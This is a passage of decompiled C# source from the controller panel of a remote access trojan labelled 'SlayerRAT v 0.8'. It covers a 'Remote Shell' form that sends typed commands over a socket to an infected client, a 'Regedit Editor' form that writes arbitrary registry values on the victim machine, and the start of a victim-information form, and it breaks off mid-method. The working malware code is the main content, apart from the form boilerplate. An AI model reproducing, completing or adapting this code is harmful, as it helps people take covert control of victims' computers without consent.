		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_Shell.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_Shell.__ENCList.Count == Frm_Shell.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_Shell.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_Shell.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_Shell.__ENCList[num] = Frm_Shell.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_Shell.__ENCList.RemoveRange(num, Frm_Shell.__ENCList.Count - num);
						Frm_Shell.__ENCList.Capacity = Frm_Shell.__ENCList.Count;
					}
					Frm_Shell.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_Shell));
			this.T2 = new TextBox();
			this.Timer1 = new Timer(this.components);
			this.Label1 = new Label();
			this.Panel1 = new Panel();
			this.Button1 = new Button();
			this.Panel2 = new Panel();
			this.T1 = new RichTextBox();
			this.Panel1.SuspendLayout();
			this.Panel2.SuspendLayout();
			this.SuspendLayout();
			this.T2.BackColor = Color.Black;
			this.T2.BorderStyle = BorderStyle.FixedSingle;
			this.T2.Dock = DockStyle.Right;
			this.T2.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.T2.ForeColor = Color.LightSteelBlue;
			Control arg_101_0 = this.T2;
			Point location = new Point(111, 0);
			arg_101_0.Location = location;
			this.T2.Multiline = true;
			this.T2.Name = "T2";
			Control arg_13C_0 = this.T2;
			Size size = new Size(375, 30);
			arg_13C_0.Size = size;
			this.T2.TabIndex = 0;
			this.T2.Text = "netstat -aon";
			this.Label1.AutoSize = true;
			this.Label1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label1.ForeColor = Color.Black;
			Control arg_1B2_0 = this.Label1;
			location = new Point(156, 17);
			arg_1B2_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_1DD_0 = this.Label1;
			size = new Size(80, 13);
			arg_1DD_0.Size = size;
			this.Label1.TabIndex = 3;
			this.Label1.Text = "Tip Command";
			this.Panel1.Controls.Add(this.Button1);
			this.Panel1.Controls.Add(this.T2);
			this.Panel1.Controls.Add(this.Label1);
			this.Panel1.Dock = DockStyle.Bottom;
			Control arg_268_0 = this.Panel1;
			location = new Point(0, 212);
			arg_268_0.Location = location;
			this.Panel1.Name = "Panel1";
			Control arg_296_0 = this.Panel1;
			size = new Size(486, 30);
			arg_296_0.Size = size;
			this.Panel1.TabIndex = 4;
			this.Button1.BackColor = Color.Black;
			this.Button1.Dock = DockStyle.Bottom;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_314_0 = this.Button1;
			location = new Point(0, 0);
			arg_314_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_33F_0 = this.Button1;
			size = new Size(111, 30);
			arg_33F_0.Size = size;
			this.Button1.TabIndex = 4;
			this.Button1.Text = "Delete";
			this.Button1.UseVisualStyleBackColor = false;
			this.Panel2.Controls.Add(this.T1);
			this.Panel2.Dock = DockStyle.Fill;
			Control arg_3A5_0 = this.Panel2;
			location = new Point(0, 0);
			arg_3A5_0.Location = location;
			this.Panel2.Name = "Panel2";
			Control arg_3D6_0 = this.Panel2;
			size = new Size(486, 212);
			arg_3D6_0.Size = size;
			this.Panel2.TabIndex = 5;
			this.T1.BackColor = Color.Black;
			this.T1.BorderStyle = BorderStyle.FixedSingle;
			this.T1.Dock = DockStyle.Fill;
			this.T1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.T1.ForeColor = Color.White;
			Control arg_454_0 = this.T1;
			location = new Point(0, 0);
			arg_454_0.Location = location;
			this.T1.Name = "T1";
			Control arg_485_0 = this.T1;
			size = new Size(486, 212);
			arg_485_0.Size = size;
			this.T1.TabIndex = 2;
			this.T1.Text = "";
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(486, 242);
			this.ClientSize = size;
			this.Controls.Add(this.Panel2);
			this.Controls.Add(this.Panel1);
			this.ForeColor = SystemColors.Control;
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "Frm_Shell";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Remote Shell";
			this.Panel1.ResumeLayout(false);
			this.Panel1.PerformLayout();
			this.Panel2.ResumeLayout(false);
			this.ResumeLayout(false);
		}

		public Frm_Shell()
		{
			base.Load += new EventHandler(this.shl_Load);
			base.FormClosing += new FormClosingEventHandler(this.shl_FormClosing);
			base.Resize += new EventHandler(this.shl_Resize);
			Frm_Shell.__ENCAddToList(this);
			base.FormClosing += new FormClosingEventHandler(this.shl_FormClosing);
			base.Resize += new EventHandler(this.shl_Resize);
			base.Load += new EventHandler(this.shl_Load);
			this.A = new string[5];
			this.idx = 0;
			this.it = 0;
			this.InitializeComponent();
		}

		private void shl_FormClosing(object sender, FormClosingEventArgs e)
		{
			bool cN = this.sk.CN;
			if (cN)
			{
				this.sk.Send("rsc");
			}
		}

		private void shl_Load(object sender, EventArgs e)
		{
			this.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(sokserver.vno(this.sk.L)));
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = !this.sk.CN;
			if (flag)
			{
				this.Close();
			}
		}

		private void T2_KeyDown(object sender, KeyEventArgs e)
		{
			Keys keyCode = e.KeyCode;
			bool flag = keyCode == Keys.Return;
			checked
			{
				if (flag)
				{
					string text = this.T2.Text;
					this.T2.Text = "";
					e.SuppressKeyPress = true;
					this.A[this.it] = text;
					this.it++;
					flag = (this.it > this.A.Length - 1);
					if (flag)
					{
						this.it = 0;
					}
					this.sk.Send("rs" + sokserver.Y + FN.ENB(ref text));
				}
				else
				{
					flag = (keyCode == Keys.Down);
					if (flag)
					{
						this.idx += -1;
						flag = (this.idx < 0);
						if (flag)
						{
							this.idx = 0;
						}
						this.T2.Text = this.A[this.idx];
					}
					else
					{
						flag = (keyCode == Keys.Up);
						if (flag)
						{
							this.idx++;
							flag = (this.idx > this.A.Length - 1);
							if (flag)
							{
								this.idx = this.A.Length - 1;
							}
							this.T2.Text = this.A[this.idx];
						}
					}
				}
			}
		}

		private void shl_Resize(object sender, EventArgs e)
		{
			this.T1.ScrollToCaret();
		}

		private void T1_TextChanged(object sender, EventArgs e)
		{
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.T1.Text, "", false) != 0;
			if (flag)
			{
			}
			this.T1.SelectionStart = this.T1.TextLength;
			this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
			this.T1.SelectionFont = this.T1.Font;
			this.T1.AppendText(this.T2.Text + "\r\n");
			this.T1.SelectionStart = this.T1.TextLength;
			this.T1.ScrollToCaret();
			TextBox t = this.T2;
			string text = t.Text;
			t.Text = text;
			this.sk.Send("!" + sokserver.Y + FN.ENB(ref text));
			this.T1.Text = "";
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_registry : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("ComboBox1")]
		private ComboBox _ComboBox1;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("TextBox3")]
		private TextBox _TextBox3;

		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		[AccessedThroughProperty("Reg1")]
		private TextBox _Reg1;

		public string Path;

		public Client sk;

		internal virtual ComboBox ComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ComboBox1 = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual TextBox TextBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox3 = value;
			}
		}

		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		internal virtual Label Label3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label3 = value;
			}
		}

		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		internal virtual TextBox Reg1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Reg1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Reg1 = value;
			}
		}

		[DebuggerNonUserCode]
		public Frm_registry()
		{
			Frm_registry.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_registry.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_registry.__ENCList.Count == Frm_registry.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_registry.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_registry.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_registry.__ENCList[num] = Frm_registry.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_registry.__ENCList.RemoveRange(num, Frm_registry.__ENCList.Count - num);
						Frm_registry.__ENCList.Capacity = Frm_registry.__ENCList.Count;
					}
					Frm_registry.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_registry));
			this.ComboBox1 = new ComboBox();
			this.Button1 = new Button();
			this.TextBox3 = new TextBox();
			this.TextBox1 = new TextBox();
			this.Label3 = new Label();
			this.Label2 = new Label();
			this.Label1 = new Label();
			this.Reg1 = new TextBox();
			this.SuspendLayout();
			this.ComboBox1.BackColor = Color.Black;
			this.ComboBox1.FlatStyle = FlatStyle.Flat;
			this.ComboBox1.ForeColor = Color.LightSteelBlue;
			this.ComboBox1.FormattingEnabled = true;
			this.ComboBox1.Items.AddRange(new object[]
			{
				"Binary",
				"DWord",
				"ExpandString",
				"MultiString",
				"QWord",
				"String"
			});
			Control arg_11A_0 = this.ComboBox1;
			Point location = new Point(248, 20);
			arg_11A_0.Location = location;
			this.ComboBox1.Name = "ComboBox1";
			Control arg_145_0 = this.ComboBox1;
			Size size = new Size(126, 21);
			arg_145_0.Size = size;
			this.ComboBox1.TabIndex = 41;
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.LightSteelBlue;
			Control arg_1A9_0 = this.Button1;
			location = new Point(12, 113);
			arg_1A9_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_1D7_0 = this.Button1;
			size = new Size(362, 28);
			arg_1D7_0.Size = size;
			this.Button1.TabIndex = 40;
			this.Button1.Text = "Save";
			this.Button1.TextImageRelation = TextImageRelation.TextBeforeImage;
			this.Button1.UseVisualStyleBackColor = true;
			this.TextBox3.BackColor = Color.Black;
			this.TextBox3.BorderStyle = BorderStyle.FixedSingle;
			this.TextBox3.ForeColor = Color.LightSteelBlue;
			Control arg_259_0 = this.TextBox3;
			location = new Point(12, 57);
			arg_259_0.Location = location;
			this.TextBox3.Multiline = true;
			this.TextBox3.Name = "TextBox3";
			Control arg_294_0 = this.TextBox3;
			size = new Size(362, 50);
			arg_294_0.Size = size;
			this.TextBox3.TabIndex = 39;
			this.TextBox1.BackColor = Color.Black;
			this.TextBox1.BorderStyle = BorderStyle.FixedSingle;
			this.TextBox1.ForeColor = Color.LightSteelBlue;
			Control arg_2EB_0 = this.TextBox1;
			location = new Point(14, 20);
			arg_2EB_0.Location = location;
			this.TextBox1.Name = "TextBox1";
			Control arg_319_0 = this.TextBox1;
			size = new Size(228, 22);
			arg_319_0.Size = size;
			this.TextBox1.TabIndex = 38;
			this.Label3.AutoSize = true;
			Control arg_34E_0 = this.Label3;
			location = new Point(12, 44);
			arg_34E_0.Location = location;
			this.Label3.Name = "Label3";
			Control arg_379_0 = this.Label3;
			size = new Size(42, 13);
			arg_379_0.Size = size;
			this.Label3.TabIndex = 37;
			this.Label3.Text = "Value :";
			this.Label2.AutoSize = true;
			Control arg_3C1_0 = this.Label2;
			location = new Point(272, 5);
			arg_3C1_0.Location = location;
			this.Label2.Name = "Label2";
			Control arg_3EC_0 = this.Label2;
			size = new Size(38, 13);
			arg_3EC_0.Size = size;
			this.Label2.TabIndex = 36;
			this.Label2.Text = "Type :";
			this.Label1.AutoSize = true;
			Control arg_431_0 = this.Label1;
			location = new Point(10, 5);
			arg_431_0.Location = location;
			this.Label1.Name = "Label1";
			Control arg_45C_0 = this.Label1;
			size = new Size(44, 13);
			arg_45C_0.Size = size;
			this.Label1.TabIndex = 35;
			this.Label1.Text = "Name :";
			Control arg_49B_0 = this.Reg1;
			location = new Point(225, 712);
			arg_49B_0.Location = location;
			this.Reg1.Name = "Reg1";
			Control arg_4C9_0 = this.Reg1;
			size = new Size(201, 22);
			arg_4C9_0.Size = size;
			this.Reg1.TabIndex = 42;
			this.Reg1.Text = "SlayerRAT v 0.8";
			SizeF autoScaleDimensions = new SizeF(7f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(382, 149);
			this.ClientSize = size;
			this.Controls.Add(this.Reg1);
			this.Controls.Add(this.ComboBox1);
			this.Controls.Add(this.Button1);
			this.Controls.Add(this.TextBox3);
			this.Controls.Add(this.TextBox1);
			this.Controls.Add(this.Label3);
			this.Controls.Add(this.Label2);
			this.Controls.Add(this.Label1);
			this.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ForeColor = Color.LightSteelBlue;
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			size = new Size(398, 183);
			this.MaximumSize = size;
			size = new Size(398, 183);
			this.MinimumSize = size;
			this.Name = "Frm_registry";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = "Regedit Editor";
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			this.sk.Send(string.Concat(new string[]
			{
				"RG",
				sokserver.Y,
				"!",
				sokserver.Y,
				this.Path,
				sokserver.Y,
				this.TextBox1.Text,
				sokserver.Y,
				this.TextBox3.Text,
				sokserver.Y,
				Convert.ToString(this.Typ(this.ComboBox1.Text))
			}));
			this.Close();
		}

		public int Typ(string t)
		{
			string left = t.ToLower();
			bool flag = Operators.CompareString(left, RegistryValueKind.Binary.ToString().ToLower(), false) == 0;
			int result;
			if (flag)
			{
				result = 3;
			}
			else
			{
				flag = (Operators.CompareString(left, RegistryValueKind.DWord.ToString().ToLower(), false) == 0);
				if (flag)
				{
					result = 4;
				}
				else
				{
					flag = (Operators.CompareString(left, RegistryValueKind.ExpandString.ToString().ToLower(), false) == 0);
					if (flag)
					{
						result = 2;
					}
					else
					{
						flag = (Operators.CompareString(left, RegistryValueKind.MultiString.ToString().ToLower(), false) == 0);
						if (flag)
						{
							result = 7;
						}
						else
						{
							flag = (Operators.CompareString(left, RegistryValueKind.QWord.ToString().ToLower(), false) == 0);
							if (flag)
							{
								result = 11;
							}
							else
							{
								flag = (Operators.CompareString(left, RegistryValueKind.String.ToString().ToLower(), false) == 0);
								if (flag)
								{
									result = 1;
								}
								else
								{
									int num;
									result = num;
								}
							}
						}
					}
				}
			}
			return result;
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using nj.My.Resources;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_VInfo : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		[AccessedThroughProperty("ContextMenuStrip1")]
		private ContextMenuStrip _ContextMenuStrip1;

		[AccessedThroughProperty("CopiarToolStripMenuItem")]
		private ToolStripMenuItem _CopiarToolStripMenuItem;

		[AccessedThroughProperty("CopiarTudoToolStripMenuItem")]
		private ToolStripMenuItem _CopiarTudoToolStripMenuItem;

		[AccessedThroughProperty("ChangeSelectedColorToolStripMenuItem")]
		private ToolStripMenuItem _ChangeSelectedColorToolStripMenuItem;

		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("Panel3")]
		private Panel _Panel3;

		[AccessedThroughProperty("ListView1")]
		private ListView _ListView1;

		[AccessedThroughProperty("ColumnHeader1")]
		private ColumnHeader _ColumnHeader1;

		[AccessedThroughProperty("ColumnHeader2")]
		private ColumnHeader _ColumnHeader2;

		[AccessedThroughProperty("ColumnHeader3")]
		private ColumnHeader _ColumnHeader3;

		[AccessedThroughProperty("ProgressBar1")]
		private ProgressBar _ProgressBar1;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		[AccessedThroughProperty("LogInComboBox1")]
		private LogInComboBox _LogInComboBox1;

		[AccessedThroughProperty("LogInComboBox2")]
		private LogInComboBox _LogInComboBox2;

		[AccessedThroughProperty("LogInComboBox3")]
		private LogInComboBox _LogInComboBox3;

		[AccessedThroughProperty("vmethod_4")]
		private Timer _vmethod_4;

		[AccessedThroughProperty("Timer2")]
		private Timer _Timer2;

		[AccessedThroughProperty("ProgressBar2")]
		private ProgressBar _ProgressBar2;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		public Client osk;

		public string QQ;

		public Client sk;

		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		internal virtual ToolStripMenuItem CopiarToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopiarToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopiarToolStripMenuItem_Click);
				bool flag = this._CopiarToolStripMenuItem != null;
				if (flag)
				{
					this._CopiarToolStripMenuItem.Click -= value2;
				}
				this._CopiarToolStripMenuItem = value;
				flag = (this._CopiarToolStripMenuItem != null);
				if (flag)
				{
					this._CopiarToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem CopiarTudoToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopiarTudoToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopiarTudoToolStripMenuItem_Click);
				bool flag = this._CopiarTudoToolStripMenuItem != null;
				if (flag)
				{
					this._CopiarTudoToolStripMenuItem.Click -= value2;
				}
				this._CopiarTudoToolStripMenuItem = value;
				flag = (this._CopiarTudoToolStripMenuItem != null);
				if (flag)
				{
					this._CopiarTudoToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ChangeSelectedColorToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ChangeSelectedColorToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ChangeSelectedColorToolStripMenuItem_Click);
				bool flag = this._ChangeSelectedColorToolStripMenuItem != null;
				if (flag)
				{
					this._ChangeSelectedColorToolStripMenuItem.Click -= value2;
				}
				this._ChangeSelectedColorToolStripMenuItem = value;
				flag = (this._ChangeSelectedColorToolStripMenuItem != null);
				if (flag)
				{
					this._ChangeSelectedColorToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				flag = (this._Timer1 != null);
				if (flag)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		internal virtual Panel Panel3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel3 = value;
			}
		}

		internal virtual ListView ListView1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ListView1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ListView1 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader1 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader2 = value;
			}
		}

		internal virtual ColumnHeader ColumnHeader3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader3 = value;
			}
		}

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button2 = value;
			}
		}

		internal virtual LogInComboBox LogInComboBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInComboBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInComboBox1 = value;
			}
		}

		internal virtual LogInComboBox LogInComboBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInComboBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInComboBox2 = value;
			}
		}

		internal virtual LogInComboBox LogInComboBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInComboBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInComboBox3 = value;
			}
		}

		internal virtual Timer vmethod_4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.vmethod_4_Tick);
				bool flag = this._vmethod_4 != null;
				if (flag)
				{
					this._vmethod_4.Tick -= value2;
				}
				this._vmethod_4 = value;
				flag = (this._vmethod_4 != null);
				if (flag)
				{
					this._vmethod_4.Tick += value2;
				}
			}
		}

		internal virtual Timer Timer2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2_Tick);
				bool flag = this._Timer2 != null;
				if (flag)
				{
					this._Timer2.Tick -= value2;
				}
				this._Timer2 = value;
				flag = (this._Timer2 != null);
				if (flag)
				{
					this._Timer2.Tick += value2;
				}
			}
		}

		internal virtual ProgressBar ProgressBar2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar2 = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Label Label4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label4 = value;
			}
		}

		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		[DebuggerNonUserCode]
		public Frm_VInfo()
		{
			base.Load += new EventHandler(this.Informações_By_SooftT_Load);
			Frm_VInfo.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_VInfo.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_VInfo.__ENCList.Count == Frm_VInfo.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_VInfo.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_VInfo.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_VInfo.__ENCList[num] = Frm_VInfo.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
